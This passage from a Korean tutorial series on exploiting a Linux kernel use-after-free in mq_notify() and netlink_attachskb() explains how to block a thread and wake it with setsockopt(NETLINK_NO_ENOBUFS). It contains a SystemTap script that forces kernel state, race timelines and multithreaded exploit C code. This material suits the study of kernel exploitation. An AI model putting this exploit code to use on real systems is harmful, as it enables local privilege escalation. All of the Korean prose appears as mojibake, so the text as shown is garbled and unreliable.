[ì´ì „ íŒŒíŠ¸](https://chamalane.herokuapp.com/posts/5d4ef9fb907a8600042c4cca)ì—ì„œ netlink\_attachskb()ê°€ 1ì„ ë°˜í™˜í•˜ê²Œ í•˜ë ¤ê³  ì—¬ëŸ¬ ë¬¸ì œ(issue)ë¥¼ í•´ê²°(experiment)í–ˆë‹¤. ì²« ë¬¸ì œëŠ” mq\_notify()ë¥¼ í˜¸ì¶œí•˜ë©´ **block**ëœë‹¤ëŠ” ê²ƒì´ì—ˆë‹¤. ì´ê±¸ í•´ê²°í•˜ë ¤ê³  schedule\_timeout() í˜¸ì¶œì„ ìš°íšŒí–ˆë”ë‹ˆ **ë¬´í•œ ë£¨í”„**ì— ë¹ ì¡Œë‹¤. file descriptor table (FDT)ì—ì„œ file descriptorë¥¼ ì œê±°í•˜ì—¬ ë¬´í•œ ë£¨í”„ë¥¼ ë©ˆì·„ëŠ”ë° ìš°ì—°íˆ ë§ˆì§€ë§‰ ì¡°ê±´(ë‘ ë²ˆì§¸ fget() í˜¸ì¶œì˜ NULL ë°˜í™˜)ê¹Œì§€ ë“¤ì–´ë§ì•˜ë‹¤. ì´ ëª¨ë“  ê²ƒì€ System Tap ìŠ¤í¬ë¦½íŠ¸ë¥¼ í†µí•´ ê°€ëŠ¥í–ˆë‹¤:

```stap
    function force_trigger:long (arg_sock:long)
    %{
      struct sock *sk = (void*) STAP_ARG_arg_sock;
[0]   sk->sk_flags |= (1 << SOCK_DEAD); // avoid blocking the thread

      struct netlink_sock *nlk = (void*) sk;
      nlk->state |= 1;   // enter the netlink_attachskb() retry path    

      struct files_struct *files = current->files;
      struct fdtable *fdt = files_fdtable(files);
      fdt->fd[3] = NULL; // makes the second call to fget() fails
    %}
```

ì´ë²ˆ ì„¹ì…˜ì—ì„  struct sockì˜ SOCK\_DEAD í”Œë˜ê·¸ë¥¼ ì„¤ì •í•˜ëŠ” [0]ë²ˆ ë¼ì¸ì„ ì œê±°í•  ê²ƒì´ë‹¤. ê·¸ë ‡ê²Œ í•˜ë©´ mq\_notify()ì— ëŒ€í•œ í˜¸ì¶œì´ ë‹¤ì‹œ blockë  í…ë°, ì—¬ê¸°ì„œ ë‘ ê°€ì§€ ê°€ëŠ¥ì„±ì´ ìˆë‹¤:

1. (stap ìŠ¤í¬ë¦½íŠ¸ì—ì„œì²˜ëŸ¼) sockì„ SOCK\_DEADë¡œ ë§ˆí‚¹(mark) 
2. ìŠ¤ë ˆë“œë¥¼ unblock

## Control (and win) the race

ìš°ë¦¬ì˜ ë©”ì¸ ìŠ¤ë ˆë“œê°€ blockë˜ëŠ” ê²ƒì€ ì‚¬ì‹¤ **ì¢‹ì€ ì¼ì´ë‹¤**. ìµìŠ¤í”Œë¡œì‡ì„ í•˜ëŠ” ê´€ì ì—ì„  ì„ ë¬¼ê³¼ë„ ê°™ë‹¤. íŒ¨ì¹˜ ì„¤ëª…ì— "ì‘ì€ ê¸°íšŒ"ë¼ê³  ì í˜€ ìˆì—ˆë˜ ê²Œ ê¸°ì–µì´ ë‚˜ëŠ”ê°€? ìš°ë¦¬ì˜ ê³µê²© ì‹œë‚˜ë¦¬ì˜¤ë¥¼ ë‹¤ì‹œ ë³´ì:

```plaintext
Thread-1                            | Thread-2              | file refcnt | sock refcnt | sock ptr           |
------------------------------------+-----------------------+-------------+-------------+--------------------+
 mq_notify()                        |                       | 1           | 1           | NULL               |
                                    |                       |             |             |                    |
  fget(<TARGET_FD>) -> ok           |                       | 2 (+1)      | 1           | NULL               |
                                    |                       |             |             |                    |
  netlink_getsockbyfilp() -> ok     |                       | 2           | 2 (+1)      | 0xffffffc0aabbccdd |
                                    |                       |             |             |                    |
  fput(<TARGET_FD>) -> ok           |                       | 1 (-1)      | 2           | 0xffffffc0aabbccdd |
                                    |                       |             |             |                    |
  netlink_attachskb() -> returns 1  |                       | 1           | 1 (-1)      | 0xffffffc0aabbccdd |
                                    |                       |             |             |                    |
                                    | close(<TARGET_FD>)    | 0 (-1)      | 0 (-1)      | 0xffffffc0aabbccdd |
                                    |                       |             |             |                    |
  goto retry                        |                       | FREE        | FREE        | 0xffffffc0aabbccdd |
                                    |                       |             |             |                    |
  fget(<TARGET_FD) -> returns NULL  |                       | FREE        | FREE        | 0xffffffc0aabbccdd |
                                    |                       |             |             |                    |
  goto out                          |                       | FREE        | FREE        | 0xffffffc0aabbccdd |
                                    |                       |             |             |                    |
  netlink_detachskb() -> UAF!       |                       | FREE        | (-1) in UAF | 0xffffffc0aabbccdd |
```

ê·¸ëŸ¬ë‹ˆê¹Œ, "ì‘ì€ ê¸°íšŒ"ê°€ close()ë¥¼ í˜¸ì¶œí•  ê¸°íšŒì¸ ê²ƒì´ë‹¤. ìƒê¸°í•´ë³´ë©´ close()ë¥¼ í˜¸ì¶œí•˜ëŠ” ê²ƒì´ fget()ì´ NULLì„ ë°˜í™˜í•˜ë„ë¡ í•œë‹¤. ê¸°íšŒëŠ” fget() í˜¸ì¶œì´ ì„±ê³µí•œ **ì´í›„ì—** ìƒê¸°ê³ , ë‘ ë²ˆì§¸ fget() í˜¸ì¶œ **ì´ì „ì—** ì—†ì–´ì§„ë‹¤. ê³µê²© ì‹œë‚˜ë¦¬ì˜¤ë¥¼ ë³´ë©´ netlink\_attachskb() ì´í›„ì— close()ë¥¼ í˜¸ì¶œí•˜ëŠ”ë°, system tap ìŠ¤í¬ë¦½íŠ¸ì—ì„  netlink\_attachskb() ì´ì „ì— (close()ë¥¼ í˜¸ì¶œí•˜ì§€ ì•Šê³ ) *ì‹œë®¬ë ˆì´ì…˜*ì„ í–ˆë‹¤.

schedule\_timeout() í˜¸ì¶œì„ ìš°íšŒí•˜ë©´ ê¸°íšŒëŠ” ì •ë§ "ì‘ì„" ê²ƒì´ë‹¤. System Tapì„ ì‚¬ìš©í•  ë• netlink\_attachskb()ë¥¼ í˜¸ì¶œí•˜ê¸° ì „ ë°ì´í„° êµ¬ì¡°ë¥¼ ë°”ê¿¨ê¸° ë•Œë¬¸ì— ë¬¸ì œê°€ ë˜ì§€ ì•Šì•˜ë‹¤. ìœ ì € ì˜ì—­ì—ì„  ê·¸ë¦¬ ìˆœíƒ„ì¹˜ ì•Šì„ ê²ƒì´ë‹¤.

ë°˜ë©´ì—, netlink\_attachskb() ì‹¤í–‰ ë„ì¤‘ì— blockì„ í•˜ê³  unlockí•  ë°©ë²•ì´ ìˆë‹¤ë©´ ê¸°íšŒëŠ” ìš°ë¦¬ê°€ ì›í•˜ëŠ” ë§Œí¼ ì»¤ì§ˆ ê²ƒì´ë‹¤. ë‹¤ë¥¸ ë§ë¡œ í•˜ë©´ **race conditionì„ í†µì œí• ** ë°©ë²•ì´ ìˆë‹¤ëŠ” ê²ƒì´ë‹¤. ì´ë¥¼ ë©”ì¸ ìŠ¤ë ˆë“œ íë¦„ì—ì„œì˜ "ë¸Œë ˆì´í¬í¬ì¸íŠ¸"ë¼ê³  ë³¼ ìˆ˜ë„ ìˆë‹¤.

ê³µê²© ì‹œë‚˜ë¦¬ì˜¤ëŠ” ë‹¤ìŒê³¼ ê°™ì´ ë³€í•œë‹¤.

```plaintext
Thread-1                            | Thread-2              | file refcnt | sock refcnt | sock ptr           |
------------------------------------+-----------------------+-------------+-------------+--------------------+
 mq_notify()                        |                       | 1           | 1           | NULL               |
  fget(<TARGET_FD>) -> ok           |                       | 2 (+1)      | 1           | NULL               |
                                    |                       |             |             |                    |
  netlink_getsockbyfilp() -> ok     |                       | 2           | 2 (+1)      | 0xffffffc0aabbccdd |
                                    |                       |             |             |                    |
  fput(<TARGET_FD>) -> ok           |                       | 1 (-1)      | 2           | 0xffffffc0aabbccdd |
                                    |                       |             |             |                    |
  netlink_attachskb()               |                       | 1           | 2           | 0xffffffc0aabbccdd |
                                    |                       |             |             |                    |
    schedule_timeout() -> SLEEP     |                       | 1           | 2           | 0xffffffc0aabbccdd |
                                    |                       |             |             |                    |
                                    | close(<TARGET_FD>)    | 0 (-1)      | 1 (-1)      | 0xffffffc0aabbccdd |
                                    |                       |             |             |                    |
                                    | UNBLOCK THREAD-1      | FREE        | 1           | 0xffffffc0aabbccdd |
    <<< Thread-1 wakes up >>>       |                       |             |             |                    |
    sock_put()                      |                       | FREE        | 0 (-1)      | 0xffffffc0aabbccdd |
                                    |                       |             |             |                    |
  netlink_attachskb() -> returns 1  |                       | FREE        | FREE        | 0xffffffc0aabbccdd |
                                    |                       |             |             |                    |
  goto retry                        |                       | FREE        | FREE        | 0xffffffc0aabbccdd |
                                    |                       |             |             |                    |
  fget(<TARGET_FD) -> returns NULL  |                       | FREE        | FREE        | 0xffffffc0aabbccdd |
                                    |                       |             |             |                    |
  goto out                          |                       | FREE        | FREE        | 0xffffffc0aabbccdd |
                                    |                       |             |             |                    |
  netlink_detachskb() -> UAF!       |                       | FREE        | (-1) in UAF | 0xffffffc0aabbccdd |
```

ë©”ì¸ ìŠ¤ë ˆë“œë¥¼ blockí•˜ëŠ” ê²ƒì€ race conditionì„ í†µì œí•  ì¢‹ì€ ì•„ì´ë””ì–´ì§€ë§Œ, ì´ì œ unblockí•  ë°©ë²•ì„ ì°¾ì•„ì•¼ í•œë‹¤.

## Identify "unblocker" candidates

"Core Concepts #2" ì„¹ì…˜ì˜ ë‚´ìš©ì„ ì´í•´í•˜ì§€ ëª»í–ˆë‹¤ë©´ ë‚˜ì¤‘ì— ë‹¤ì‹œ ëŒì•„ì˜¬ ìˆœê°„ì´ ìƒê¸´ë‹¤. ì´ë²ˆ ì„¹ì…˜ì—ì„  netlink\_attachskb()ê°€ ì–´ë–»ê²Œ blockì„ í•˜ê³  ì–´ë–»ê²Œ ê·¸ê±¸ unblockí•˜ëŠ”ì§€ë¥¼ ë³¼ ê²ƒì´ë‹¤.

netlink\_attachskb()ë¥¼ ë‹¤ì‹œ ë³´ì:
```c
    // [net/netlink/af_netlink.c]

    int netlink_attachskb(struct sock *sk, struct sk_buff *skb,
              long *timeo, struct sock *ssk)
    {
      struct netlink_sock *nlk;

      nlk = nlk_sk(sk);

      if (atomic_read(&sk->sk_rmem_alloc) > sk->sk_rcvbuf || test_bit(0, &nlk->state)) {
[0]     DECLARE_WAITQUEUE(wait, current);

        if (!*timeo) {
          // ... cut (unreachable code from mq_notify) ...
        }

[1]     __set_current_state(TASK_INTERRUPTIBLE);
[2]     add_wait_queue(&nlk->wait, &wait);

[3]     if ((atomic_read(&sk->sk_rmem_alloc) > sk->sk_rcvbuf || test_bit(0, &nlk->state)) &&
            !sock_flag(sk, SOCK_DEAD))
[4]       *timeo = schedule_timeout(*timeo);

[5]     __set_current_state(TASK_RUNNING);
[6]     remove_wait_queue(&nlk->wait, &wait);

        sock_put(sk);

        if (signal_pending(current)) {
          kfree_skb(skb);
          return sock_intr_errno(*timeo);
        }
        return 1;
      }
      skb_set_owner_r(skb, sk);
      return 0;
    }
```

ì´ì œ ì½”ë“œê°€ ìµìˆ™í•  ê²ƒì´ë‹¤. ìŠ¤ë ˆë“œ blockingì€ **\_\_set\_current\_state(TASK\_INTERRUPTIBLE)** [1]ê³¼ **schedule\_timeout()** [4]ì˜ ì¡°í•©ìœ¼ë¡œ ì´ë£¨ì–´ì§„ë‹¤. ì¡°ê±´ [3]ì€ ë‹¤ìŒ ë•Œë¬¸ì— ì°¸ì´ë‹¤:

* System Tapìœ¼ë¡œ ê°•ì œí–ˆë‹¤: *nlk->state* |= *1*
* sockì´ ì´ì œ DEAD ìƒíƒœê°€ ì•„ë‹ˆë‹¤. ë‹¤ìŒ ë¼ì¸ì„ ì‚­ì œí–ˆë‹¤: *sk->sk\_flags* |= *(1 << SOCK\_DEAD)*

**ë…¸íŠ¸**: schedule\_timeout(MAX\_SCHEDULE\_TIMEOUT) í˜¸ì¶œì€ schedule()ì„ í˜¸ì¶œí•˜ëŠ” ê²ƒê³¼ ê°™ë‹¤.

ì•Œë‹¤ì‹œí”¼ blockëœ ìŠ¤ë ˆë“œëŠ” **wake queue**ì— ë“±ë¡ë˜ì–´ ìˆì„ ë•Œ ê¹¨ì›Œì§ˆ ìˆ˜ ìˆë‹¤. wait queueì— ë“±ë¡ë˜ëŠ” ê²ƒì€ [0]ê³¼ [2]ë¥¼ í†µí•´ì„œ, ë“±ë¡ í•´ì œë˜ëŠ” ê²ƒì€ [6]ì—ì„œ ì´ë£¨ì–´ì§„ë‹¤. wait queue ìì²´ëŠ” **nlk->wait**ì´ë‹¤. ì¦‰ netlink\_sock ì˜¤ë¸Œì íŠ¸ì— ì†í•´ìˆë‹¤:

```c
struct netlink_sock {
    /* struct sock has to be the first member of netlink_sock */
    struct sock     sk;
  // ... cut ...
    wait_queue_head_t   wait;           // <----- the wait queue
  // ... cut ...
};
```

ì´ëŠ” **blockëœ ìŠ¤ë ˆë“œë¥¼ ê¹¨ìš°ëŠ” ê²ƒì€ netlink\_sock ì˜¤ë¸Œì íŠ¸ì˜ ì—­í• **ì´ë¼ëŠ” ëœ»ì´ë‹¤.

*nlk->wait* wait queueëŠ” ë‹¤ìŒ ë„¤ êµ°ë°ì—ì„œ ì‚¬ìš©ëœë‹¤:

1. \_\_netlink\_create()
2. netlink\_release()
3. netlink\_rcv\_wake()
4. netlink\_setsockopt()

\_\_netlink\_create() í•¨ìˆ˜ëŠ” netlink socket ìƒì„± ì¤‘ì— í˜¸ì¶œë˜ê³  ë¹„ì–´ìˆëŠ” wait queueë¥¼ **init\_waitqueue\_head()**ë¡œ ì´ˆê¸°í™”í•œë‹¤.

*netlink\_rcv\_wake()* í•¨ìˆ˜ëŠ” **netlink\_recvmsg()**ì— ì˜í•´ ì‹¤í–‰ë˜ì–´ **wake\_up\_interruptible()**ì„ í˜¸ì¶œí•œë‹¤. *block* ì´ ë˜ëŠ” ì²« ì´ìœ ê°€ receive bufferê°€ ê½‰ ì°¨ìˆë‹¤ëŠ” ê²ƒì´ì—ˆìœ¼ë¯€ë¡œ ì´ëŠ” ë§ì´ ëœë‹¤(?). *netlink\_recvmsg()* ê°€ ì‹¤í–‰ëœë‹¤ë©´ ì´ëŠ” receive bufferì— ë‚¨ì€ ê³µê°„ì´ ìˆì„ ê°€ëŠ¥ì„±ì´ ìˆëŠ” ê²ƒì´ë‹¤.

*netlink\_release()*  í•¨ìˆ˜ëŠ” ì—°ê´€ëœ struct fileì´ freeë˜ë ¤ í•  ë•Œ(ë ˆí¼ëŸ°ìŠ¤ ì¹´ìš´í„°ê°€ 0ì´ ë  ë•Œ) ì‹¤í–‰ë˜ê³  **wake\_up\_interruptible\_all()** í•¨ìˆ˜ë¥¼ ì‹¤í–‰í•œë‹¤.

ë§ˆì§€ë§‰ìœ¼ë¡œ *netlnk\_release()* ëŠ” *setsockopt()* syscallì„ í†µí•´ ì‹¤í–‰ëœë‹¤. "optname"ì´ **NETLINK\_NO\_ENOBUFS**ë¼ë©´ **wake\_up\_interruptible()**ì´ í˜¸ì¶œëœë‹¤.

ì´ì œ ìš°ë¦¬ì˜ ìŠ¤ë ˆë“œë¥¼ ê¹¨ì›Œì¤„ í›„ë³´ê°€ ì…‹ ìˆë‹¤(netlink\_create()ëŠ” ì•„ë¬´ ê²ƒë„ ê¹¨ìš°ì§€ ì•Šê¸° ë•Œë¬¸ì— ì œì™¸ë˜ì—ˆë‹¤). ì´ëŸ° ì„ íƒì˜ ê¸°ë¡œì—ì„œ ë‹¤ìŒê³¼ ê°™ì€ ê²½ë¡œë¥¼ ê³¨ë¼ì•¼ í•œë‹¤:

* ì›í•˜ëŠ” íƒ€ê²Ÿ(ìš°ë¦¬ì˜ ê²½ìš°ì—” wake\_up\_interruptible())ì— ë¹ ë¥´ê²Œ ë„ë‹¬í•  ìˆ˜ ìˆëŠ” ê²ƒ. ì¦‰ ì ì€ ìˆ˜ì˜ "ì¡°ê±´"ì„ í†µê³¼í•˜ë©´ ë˜ëŠ” ê²ƒ.
* ì»¤ë„ì— ì˜í–¥/ë¶€ì‘ìš©ì´ ì ì€ ê²ƒ(ë©”ëª¨ë¦¬ í• ë‹¹ ì—†ìŒ, ë‹¤ë¥¸ ë°ì´í„° êµ¬ì¡°ë¥¼ ê±´ë“œë¦¬ì§€ ì•ŠìŒ ë“±).

netlink\_release() ê²½ë¡œëŠ” ìµìŠ¤í”Œë¡œì‡ê³¼ ê´€ë ¨ëœ ë¬¸ì œë¡œ ì œì™¸ëœë‹¤. [part 3](https://chamalane.herokuapp.com/posts/5d503601c040080004228197)ì—ì„œ ë³¼ ìˆ˜ ìˆë“¯ì´ sockì— ì—°ê´€ëœ struct fileì„ freeí•˜ë©´ ì•ˆëœë‹¤. ì´ëŠ” ê·¸ struct fileì´ ìš°ë¦¬ê°€ ì¡°ì‹¬ìŠ¤ëŸ½ê²Œ use-after-freeë¥¼ íŠ¸ë¦¬ê±°í•˜ëŠ” ìˆ˜ë‹¨ì´ê¸° ë•Œë¬¸ì´ë‹¤. 

netlink\_rcv\_wake() ê²½ë¡œëŠ” ì œì¼ "ë³µì¡í•œ" ê²½ë¡œì´ë‹¤. "recvmsg()" syscallì—ì„œ í•´ë‹¹ í•¨ìˆ˜ì— ë„ë‹¬í•˜ê¸° ì „ì— *generic* ì†Œì¼“ APIì˜ ì—¬ëŸ¬ ê²€ì‚¬ë¥¼ í†µê³¼í•´ì•¼ í•œë‹¤. ê²Œë‹¤ê°€ ì—¬ëŸ¬ ê²ƒë“¤ì„ í• ë‹¹í•˜ê¸°ë„ í•œë‹¤. call traceëŠ” ë‹¤ìŒê³¼ ê°™ë‹¤:

```plaintext
- SYSCALL_DEFINE3(recvmsg)
- __sys_recvmsg
- sock_recvmsg
- __sock_recvmsg
- __sock_recvmsg_nosec  // calls sock->ops->recvmsg()
- netlink_recvmsg
- netlink_rcv_wake
- wake_up_interruptible
```

"setsockopt()"ì˜ call traceì™€ ë¹„êµí•´ë³´ì:

```plaintext
- SYSCALL_DEFINE5(setsockopt) // calls sock->ops->setsockopt()
- netlink_setsockopt()
- wake_up_interruptible
```

í›¨ì”¬ ê°„ë‹¨í•˜ì§€ ì•Šì€ê°€?

## Reaching wake\_up\_interruptible() from setsockopt syscall

ì´ì „ ì„¹ì…˜ì— ë”°ë¥´ë©´ setsockopt syscallì„ ì´ìš©í•˜ì—¬ wake\_up\_interruptible()ì— ë„ë‹¬í•˜ëŠ” ê²ƒì´ ì œì¼ ê°„ë‹¨í•œ ë°©ë²•ì´ì—ˆë‹¤. ê·¸ëŸ¼ í†µê³¼í•´ì•¼ í•˜ëŠ” ê²€ì‚¬ë“¤ì„ ë¶„ì„í•´ë³´ì:

```c
    // [net/socket.c]

    SYSCALL_DEFINE5(setsockopt, int, fd, int, level, int, optname,
        char __user *, optval, int, optlen)
    {
      int err, fput_needed;
      struct socket *sock;

[0]   if (optlen < 0)
        return -EINVAL;

      sock = sockfd_lookup_light(fd, &err, &fput_needed);
[1]   if (sock != NULL) {
        err = security_socket_setsockopt(sock, level, optname);
[2]     if (err)
          goto out_put;

[3]     if (level == SOL_SOCKET)
          err =
              sock_setsockopt(sock, level, optname, optval,
                  optlen);
        else
          err =
[4]           sock->ops->setsockopt(sock, level, optname, optval,
                  optlen);
    out_put:
        fput_light(sock->file, fput_needed);
      }
      return err;
    }
```

syscall ìì²´ì—ì„  ë‹¤ìŒì´ í•„ìš”í•˜ë‹¤:

* [0] - **optlen**ì´ ìŒìˆ˜ê°€ ì•„ë‹ ê²ƒ
* [1] - **fd**ê°€ ìœ íš¨í•œ ì†Œì¼“ì¼ ê²ƒ
* [2] - LSMì´ socketì—(for a socket) setsockopt()ë¥¼ í˜¸ì¶œí•˜ëŠ” ê²ƒì„ **ê¼­** í—ˆìš©í•´ì¤„ ê²ƒ
* [3] - **level**ì´ SOL\_SOCKETê³¼ ë‹¤ë¥¼ ê²ƒ

ì´ ëª¨ë“  ê²€ì‚¬ë¥¼ í†µê³¼í•˜ë©´ netlink\_setsockopt()ê°€ í˜¸ì¶œë  ê²ƒì´ë‹¤ [4]:

```c
    // [net/netlink/af_netlink.c]

    static int netlink_setsockopt(struct socket *sock, int level, int optname,
                char __user *optval, unsigned int optlen)
    {
      struct sock *sk = sock->sk;
      struct netlink_sock *nlk = nlk_sk(sk);
      unsigned int val = 0;
      int err;

[5]   if (level != SOL_NETLINK)
        return -ENOPROTOOPT;

[6]   if (optlen >= sizeof(int) && get_user(val, (unsigned int __user *)optval))
        return -EFAULT;

      switch (optname) {
        // ... cut (other options) ...

[7]   case NETLINK_NO_ENOBUFS:
[8]     if (val) {
          nlk->flags |= NETLINK_RECV_NO_ENOBUFS;
          clear_bit(0, &nlk->state);
[9]       wake_up_interruptible(&nlk->wait);
        } else
          nlk->flags &= ~NETLINK_RECV_NO_ENOBUFS;
        err = 0;
        break;
      default:
        err = -ENOPROTOOPT;
      }
      return err;
    }
```

ì¶”ê°€ì ì¸ ê²€ì‚¬ëŠ” ë‹¤ìŒê³¼ ê°™ë‹¤:

* [5] - **level**ì´ SOL\_NETLINKì—¬ì•¼ í•¨
* [6] - **optlen**ì´ *sizeof(int)* ë³´ë‹¤ í¬ê±°ë‚˜ ê°™ì•„ì•¼ í•˜ê³  **optval**ì´ ì½ê¸° ê°€ëŠ¥í•œ ë©”ëª¨ë¦¬ ì˜ì—­ì´ì–´ì•¼ í•¨
* [7] - **optname**ì´ NETLINK\_NO\_ENOBUFSì—¬ì•¼ í•¨
* [8] - **val**ì´ 0ì´ ì•„ë‹ˆì–´ì•¼ í•¨.

ëª¨ë“  ê²€ì‚¬ë¥¼ í†µê³¼í•˜ë©´ wake\_up\_interruptable()ì´ ì‹¤í–‰ë˜ì–´ blockëœ ìŠ¤ë ˆë“œë¥¼ ê¹¨ì›Œì¤„ ê²ƒì´ë‹¤. ë§ˆì§€ë§‰ì— ë‹¤ìŒ ì½”ë“œ ì¡°ê°(snippet)ì´ í•´ë‹¹ í•¨ìˆ˜ë¥¼ ì‹¤í–‰í•  ê²ƒì´ë‹¤:

```c
int sock_fd = _socket(AF_NETLINK, SOCK_DGRAM, NETLINK_GENERIC); // same socket used by blocking thread
int val = 3535; // different than zero
_setsockopt(sock_fd, SOL_NETLINK, NETLINK_NO_ENOBUFS, &val, sizeof(val));
```

ì´ê±¸ ìµìŠ¤í”Œë¡œì‡ì— ë°˜ì˜í•´ë³´ì

## Updating The Exploit

ì´ì „ ì„¹ì…˜ì—ì„  ì–´ë–»ê²Œ ìœ ì € ì˜ì—­ì—ì„œ setsockopt() syscallì„ ì´ìš©í•˜ì—¬ wake\_up\_interruptible()ì„ ì‹¤í–‰í•˜ëŠ”ì§€ ë³´ì•˜ë‹¤. í•˜ì§€ë§Œ ì•„ì§ ë¬¸ì œê°€ í•˜ë‚˜ ë‚¨ì•„ìˆë‹¤. blockëìœ¼ë©´ ë­˜ ì–´ë–»ê²Œ í˜¸ì¶œí•˜ëŠ”ê°€? **ì •ë‹µì€ ì—¬ëŸ¬ ìŠ¤ë ˆë“œë¥¼ ì‚¬ìš©í•˜ëŠ” ê²ƒì´ë‹¤**!

ì, ê·¸ëŸ¼ ë‹¤ë¥¸ ìŠ¤ë ˆë“œë¥¼ ìƒì„±í•˜ë„ë¡ ìµìŠ¤í”Œë¡œì‡ì„ ê°±ì‹ í•˜ì(ìµìŠ¤í”Œë¡œì‡ì—ì„œ **unblock\_thread**ë¥¼ í˜¸ì¶œí•œë‹¤)("-pthread" ì˜µì…˜ì„ ì¤˜ì„œ ì»´íŒŒì¼í•˜ì):

```c
    struct unblock_thread_arg
    {
      int fd;
      bool is_ready;  // we could use pthread's barrier here instead
    };

    static void* unblock_thread(void *arg)
    {
      struct unblock_thread_arg *uta = (struct unblock_thread_arg*) arg;
      int val = 3535; // need to be different than zero

      // notify the main thread that the unblock thread has been created
      uta->is_ready = true; 
      // WARNING: the main thread *must* directly call mq_notify() once notified!
      sleep(5); // gives some time for the main thread to block

      printf("[unblock] unblocking now\n");
      if (_setsockopt(uta->fd, SOL_NETLINK, NETLINK_NO_ENOBUFS, &val, sizeof(val)))
        perror("setsockopt");
      return NULL;
    }

    int main(void)
    {
      struct sigevent sigev;
      char sival_buffer[NOTIFY_COOKIE_LEN];
      int sock_fd;
      pthread_t tid;
      struct unblock_thread_arg uta;

      // ... cut ...

      // initialize the unblock thread arguments, and launch it
      memset(&uta, 0, sizeof(uta));
      uta.fd = sock_fd;
      uta.is_ready = false;
      printf("creating unblock thread...\n");
      if ((errno = pthread_create(&tid, NULL, unblock_thread, &uta)) != 0)
      {
        perror("pthread_create");
        goto fail;
      }
      while (uta.is_ready == false) // spinlock until thread is created
        ;
      printf("unblocking thread has been created!\n");

      printf("get ready to block\n");
      if (_mq_notify((mqd_t)-1, &sigev))
      {
        perror("mq_notify");
        goto fail;
      }
      printf("mq_notify succeed\n");

      // ... cut ...
    }
```

ì—¬ê¸°ì„œ "sleep(5)"ë¥¼ í˜¸ì¶œí•˜ê³  "uta->is\_ready"ë¡œ ë¬´ì–¸ê°€ í•œ ê²ƒì„ ì•Œ ìˆ˜ ìˆë‹¤. ì„¤ëª…í•´ì£¼ë„ë¡ í•˜ê² ë‹¤.

**pthread\_create()**ë¥¼ í˜¸ì¶œí•˜ëŠ” ê²ƒì€ ìŠ¤ë ˆë“œë¥¼ ìƒì„±í•˜ê³  ê°€ë™(launch)í•˜ëŠ” ê²ƒì„ ìš”ì²­í•˜ëŠ” ê²ƒì´ë‹¤. taskë¥¼ ìƒì„±í•œë‹¤ê³  í•´ì„œ taskê°€ ë°”ë¡œ ì‹¤í–‰ë˜ëŠ” ê²ƒì€ ì•„ë‹ˆë‹¤. ìŠ¤ë ˆë“œê°€ ì‹¤í–‰ë˜ì—ˆë‹¤ëŠ” ê²ƒì„ í™•ì‹¤íˆ í•˜ê¸° ìœ„í•´ **spinlock**: uta->is\_readyë¥¼ ì´ìš©í•œë‹¤.

**ë…¸íŠ¸**: spinlockì€ (ì‹¤ì œ) lockingì˜ ê°€ì¥ ê°„ë‹¨í•œ í˜•íƒœì´ë‹¤. ê¸°ë³¸ì ìœ¼ë¡œ ë³€ìˆ˜ì˜ ìƒíƒœê°€ ë°”ë€” ë•Œê¹Œì§€ ë£¨í”„ë¥¼ ë„ëŠ”ë° ê·¸ë™ì•ˆ CPUê°€ 99% ì‚¬ìš©ë˜ê¸° ë•Œë¬¸ì— "ìœ íš¨"(active)í•˜ë‹¤ê³  í•  ìˆ˜ ìˆë‹¤. ì›ìê°™ì€(atomic-like) ë³€ìˆ˜ë¥¼ ì‚¬ìš©í•˜ëŠ” ê²ƒì€ ì“°ëŠ” ìì™€ ì½ëŠ” ìê°€ í•˜ë‚˜ì”©ë°–ì— ì—†ê¸° ë•Œë¬¸ì— ì—¬ê¸°ì„œ ìš”êµ¬ë˜ì§„ ì•ŠëŠ”ë‹¤(?).

**ì£¼ì˜**: ë‹¤ìŒ ì„¹ì…˜ì—ì„œ "unlock" (spinlock)ê³¼ "unblock" (ê¹¨ìš°ëŠ” ê²ƒ)ì„ í—·ê°ˆë¦¬ì§€ ë§ì!

unblock\_threadê°€ unlock ('is\_readyë¥¼ trueë¡œ ì„¤ì •)í•´ì¤„ ë•Œê¹Œì§€ ë©”ì¸ ìŠ¤ë ˆë“œëŠ” ë£¨í”„ì— ê°‡í˜€ìˆë‹¤. pthredì˜ barrierë¥¼ í†µí•´ì„œë„ (í•­ìƒ ê°€ëŠ¥í•œ ê²ƒì€ ì•„ë‹ˆì§€ë§Œ) ê°™ì€ ê²°ê³¼ë¥¼ ì–»ì„ ìˆ˜ ìˆë‹¤. ì—¬ê¸°ì„œ spinlockì„ í•˜ëŠ” ê²ƒì€ ë¶€ê°€ì ì¸ ê²ƒì´ë©°, ê·¸ì € ìŠ¤ë ˆë“œ ìƒì„±ì„ í†µí•´ "ë” í†µì œë¥¼ ì˜" í•  ìˆ˜ ìˆë„ë¡ í•´ì¤„ ë¿ì´ë‹¤. ë‹¤ë¥¸ ì´ìœ ëŠ” task ìƒì„±ì—ì„œ ë©”ëª¨ë¦¬ í• ë‹¹ì´ ë§ì´ ì¼ì–´ë‚˜ ì¼ë°˜ì ìœ¼ë¡œ ìµìŠ¤í”Œë¡œì‡ì„ ë°©í•´í•˜ê¸° ë•Œë¬¸ì´ë‹¤. ë§ˆì§€ë§‰ìœ¼ë¡œ ë§¤ìš° ìœ ì‚¬í•œ í…Œí¬ë‹‰ì´ [part 3](https://chamalane.herokuapp.com/posts/5d503601c040080004228197)ì—ì„œ í•„ìš”í•˜ê¸° ë•Œë¬¸ì— ì—¬ê¸°ì„œ ì†Œê°œí•˜ì§€ ì•ŠëŠ” ê²ƒì´ë‹¤.

ë°˜ëŒ€ë¡œ pthread\_create() ì´í›„ ë©”ì¸ ìŠ¤ë ˆë“œê°€ ì˜¤ë«ë™ì•ˆ ìˆœì„œì—ì„œ ë°€ë ¸ë‹¤(= ì‹¤í–‰ë˜ì§€ ì•ŠëŠ”ë‹¤)ê³ (preempted) ê°€ì •í•´ë³´ì. ê·¸ëŸ¼ ë‹¤ìŒê³¼ ê°™ì€ ìˆœì„œë¡œ í˜ëŸ¬ê°ˆ ê²ƒì´ë‹¤.

```plaintext
Thread-1          | Thread-2
------------------+---------------------------
                  |
pthread_create()  |
                  | <<< new task created >>>
<<< preempted >>> |
                  | <<< thread starts >>>
<<< still...      |
 ...preempted >>> | setsockopt() -> succeed
                  |
mq_notify()       |
=> start BLOCKING |
```

